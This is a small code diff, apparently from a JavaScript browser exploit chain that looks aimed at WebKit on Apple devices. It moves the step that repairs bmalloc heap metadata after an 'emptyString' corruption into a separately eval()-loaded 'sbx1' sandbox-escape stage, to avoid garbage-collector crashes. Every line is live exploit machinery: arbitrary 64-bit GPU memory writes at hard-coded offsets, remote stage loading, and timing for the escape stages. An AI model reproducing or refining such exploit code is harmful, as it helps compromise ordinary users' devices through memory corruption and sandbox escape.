@@ -8395,11 +8395,13 @@
         const sc_slide = p.slide;
         const sbx1_script = getJS('/sbx1_main.js?' + Date.now());
         eval(sbx1_script);
-        LOG('Restore bmalloc metadata after emptyString Corruption');
-        gpu_write64(offsets.emptyString + 0x68n, 0x300000005n);
-        gpu_write64(offsets.emptyString + 0x70n, 0x100000080n);
-        gpu_write64(offsets.emptyString + 0x78n, 0n);
-        gpu_write64(offsets.emptyString + 0x80n, 0x1200000001n);
+        // Note: bmalloc metadata is now restored at the end of sbx1_main.js
+        // before the IIFE returns, to avoid GC crashes during eval() return.
+        // LOG('Restore bmalloc metadata after emptyString Corruption');
+        // gpu_write64(offsets.emptyString + 0x68n, 0x300000005n);
+        // gpu_write64(offsets.emptyString + 0x70n, 0x100000080n);
+        // gpu_write64(offsets.emptyString + 0x78n, 0n);
+        // gpu_write64(offsets.emptyString + 0x80n, 0x1200000001n);
         sbx1_end = Date.now();
         log(`[profiler] sbx1 took ${sbx1_end - sbx0_pac_end} ms`);
         LOG(`[+] SBX1 complete`);
